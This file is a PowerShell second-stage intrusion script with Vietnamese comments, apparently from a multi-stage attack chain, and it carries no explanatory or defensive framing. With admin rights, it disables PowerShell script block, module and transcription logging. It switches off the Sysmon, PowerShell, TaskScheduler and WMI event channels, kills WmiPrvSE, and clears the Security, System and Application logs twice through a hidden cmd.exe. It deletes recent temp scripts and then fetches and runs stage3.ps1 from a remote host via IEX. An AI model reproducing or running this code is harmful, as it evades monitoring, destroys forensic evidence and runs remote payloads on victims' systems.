function Invoke-Stage2Main {
    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    [Net.WebRequest]::DefaultWebProxy = $null

    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) { return }

    # =========================================================
    # PHASE 1: Disable CA 3 PowerShell Logging Policies
    # =========================================================
    # 1. ScriptBlockLogging
    $sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    if (-not (Test-Path $sbPath)) { New-Item -Path $sbPath -Force | Out-Null }
    Set-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord -Force

    # 2. ModuleLogging
    $mlPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
    if (-not (Test-Path $mlPath)) { New-Item -Path $mlPath -Force | Out-Null }
    Set-ItemProperty -Path $mlPath -Name "EnableModuleLogging" -Value 0 -Type DWord -Force

    # 3. Transcription
    $trPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription"
    if (-not (Test-Path $trPath)) { New-Item -Path $trPath -Force | Out-Null }
    Set-ItemProperty -Path $trPath -Name "EnableTranscripting" -Value 0 -Type DWord -Force

    # =========================================================
    # PHASE 2: Verify CA 3 Policy da disable
    # =========================================================
    Start-Sleep 1
    $sbVal = (Get-ItemProperty $sbPath -Name "EnableScriptBlockLogging" -EA SilentlyContinue).EnableScriptBlockLogging
    $mlVal = (Get-ItemProperty $mlPath -Name "EnableModuleLogging" -EA SilentlyContinue).EnableModuleLogging
    $trVal = (Get-ItemProperty $trPath -Name "EnableTranscripting" -EA SilentlyContinue).EnableTranscripting

    # Neu bat ky policy nao != 0 -> retry
    if ($sbVal -ne 0 -or $mlVal -ne 0 -or $trVal -ne 0) {
        Set-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $mlPath -Name "EnableModuleLogging" -Value 0 -Type DWord -Force
        Set-ItemProperty -Path $trPath -Name "EnableTranscripting" -Value 0 -Type DWord -Force
        Start-Sleep 1
    }

    # =========================================================
    # PHASE 3: Disable channels (wevtutil)
    # =========================================================
    wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>&1 | Out-Null
    wevtutil sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>&1 | Out-Null
    wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:false 2>&1 | Out-Null
    wevtutil sl "Microsoft-Windows-WMI-Activity/Operational" /e:false 2>&1 | Out-Null

    # =========================================================
    # PHASE 4: Kill WmiPrvSE
    # =========================================================
    Get-Process WmiPrvSE -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
    Start-Sleep 2

    # =========================================================
    # PHASE 5: Clear logs from cmd.exe (KHONG file .bat)
    # =========================================================
    $clearCmds = 'wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>nul & ' +
                 'wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" 2>nul & ' +
                 'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>nul & ' +
                 'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 2>nul & ' +
                 'wevtutil cl "Application" 2>nul & ' +
                 'wevtutil cl "System" 2>nul & ' +
                 'wevtutil cl "Security" 2>nul'

    Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $clearCmds -WindowStyle Hidden -Wait

    # =========================================================
    # PHASE 6: Sleep + 2nd pass
    # =========================================================
    Start-Sleep -Seconds 10
    Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $clearCmds -WindowStyle Hidden -Wait

    # =========================================================
    # PHASE 7: Don file tam PowerShell
    # =========================================================
    Start-Sleep 3
    Get-ChildItem "$env:TEMP\__PSScriptPolicyTest_*.ps1" -EA SilentlyContinue | 
        Remove-Item -Force -EA SilentlyContinue
    Get-ChildItem "$env:TEMP\*.ps1" -EA SilentlyContinue | 
        Where-Object { $_.LastWriteTime -gt (Get-Date).AddMinutes(-10) } | 
        Remove-Item -Force -EA SilentlyContinue

    # =========================================================
    # PHASE 8: Continue stage3.ps1
    # =========================================================
    Start-Sleep 2
    $wc = New-Object Net.WebClient
    $wc.Proxy = $null
    IEX $wc.DownloadString("https://192.168.56.100:8443/stage3.ps1")
}

Invoke-Stage2Main
